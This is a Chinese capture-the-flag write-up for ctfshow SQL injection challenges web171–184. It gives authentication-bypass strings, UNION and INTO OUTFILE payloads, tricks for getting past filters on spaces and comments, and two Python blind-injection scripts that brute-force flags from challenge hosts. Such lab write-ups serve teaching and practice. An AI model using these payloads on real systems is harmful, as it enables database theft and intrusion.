### web171

直接用万能密码  ： ' or 1=1 --+



### web172 

![image-20221123101922271](https://s2.loli.net/2022/11/24/2qSpLN8jeftZGil.png)

由于结果中不能带有flag，所以我们可以使用联合查询，直接查询密码，密码中不含flag



### web173

![image-20221123102141695](https://s2.loli.net/2022/11/24/rvFoV3Ob6n1u94M.png)

同上



### web174

![image-20221123102318570](https://s2.loli.net/2022/11/24/ul2hDG1EqwjrnaW.png)

此题忽略了flag和0-9数字，我们可以使用to_base64（）或hex（）函数编码，然后使用replace（）将数字0-9进行替换，最后将结果替换回来即可

也可以使用盲注

### web175

![image-20221124223650423](https://s2.loli.net/2022/11/24/k97TD5ymfzcr1H6.png)

此题目没有回显，可以采用时间盲注

写脚本跑一下：

![image-20221123110808841](https://s2.loli.net/2022/11/24/76mcb4WEx1pAPrl.png)



解法二：

使用写入文件，写到网站根目录

```
' union select 1,password from ctfshow_user5 into outfile "/var/www/html/a.txt"--+
```

<img src="https://s2.loli.net/2022/11/24/pJO6lLUzKj2o7Ga.png" alt="image-20221123111021130" style="zoom:25%;" />



### web176

直接使用万能密码： ' or 1=1 --+



### web177

这一题好像把空格和注释符 --+ 过滤了，

可以使用 %0a,%0b，%0c...，/**/等代替空格，%23代替注释

```
绕过空格姿势:(暂时只想起来这么多后面再补)
%09 %0a %0c %0b %0d /**/
```

```
0'%0aunion%0bselect%0a1,2,password%0afrom%0dctfshow_user%23
```

得到flag



### web178

```
1'%0aunion%0aselect%0a1,2,password%0cfrom%0actfshow_user%23
```

和上题类似



### web179

```
0'%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23
```

使用%0c代替空格，%0a，%09被过滤了



### web180

```
0'%0cunion%0cselect%0c1,group_concat(password),'3'%0cfrom%0cctfshow_user%0cwhere%0c'1
```

可以使用 --%0c 代替 --+达到注释的效果

该题目把注释符 %23  + 给注释了



### web181-182

![image-20221123114141680](https://s2.loli.net/2022/11/24/xVaWp9d8weSOJus.png)

该题把所有空格注释了，可以使用()去填充表达式，不使用空格

```
-1'or(id=26)and'1'='1    后面要使用and
```

也可以使用盲注



### web183

![image-20221123120717443](https://s2.loli.net/2022/11/24/apJ5kZGMseHwymB.png)

![image-20221123120231503](https://s2.loli.net/2022/11/24/tNnhUAmXoPYF5Id.png)

使用盲注

![image-20221124223612771](https://s2.loli.net/2022/11/24/PqTg5bwfZHG2Li6.png)

### web184

![image-20221123120703419](https://s2.loli.net/2022/11/24/hysda4fMonpRmUc.png)

此处没有过滤空格，过滤了where 单引号，双引号，

解法一：

使用右连接查询 right join:

```python
# @Author:Y4tacker
import requests

url = "http://f15ac2ca-94b7-4257-a52a-00e52ecee805.chall.ctf.show/select-waf.php"

flag = 'ctfshow{'
for i in range(45):
    if i <= 5:
        continue
    for  j in range(127):
        data = {
            "tableName": f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({j})))"
        }
        r = requests.post(url,data=data)
        if r.text.find("$user_count = 43;")>0:
            if chr(j) != ".":
                flag += chr(j)
                print(flag.lower())
                if chr(j) == "}":
                    exit(0)
                break

```



解法二：

使用group by 分组，然后使用having过滤，16进制代替字符串     盲注

```python
# -*- coding = utf-8 -*-
# @Time : 2022/11/19 21:23
# @Author : LIKE
# @File : web184.py
# @Software : PyCharm

import requests

url = 'http://4abca1ef-10dc-4717-a183-9f9667d1ed59.challenge.ctf.show/select-waf.php'
flag = 'ctfshow{'
word = '0123456789abcdefghijklmnopqrstuvwxyz-{}'


def str_to_hex(str):
    rel = ""
    for s in str:
        temp = hex(ord(s)).replace('0x', '')
        rel += temp
    return rel


for i in range(0, 100):
    for j in word:
        data = {
            'tableName': "ctfshow_user group by pass having pass like {}".format("0x" + str_to_hex(flag + j + "%"))
        }
        text = requests.post(url=url, data=data).text
        if '$user_count = 1;' in text:
            flag += j
            print(flag)
            if j == '}':
                exit(0)

```

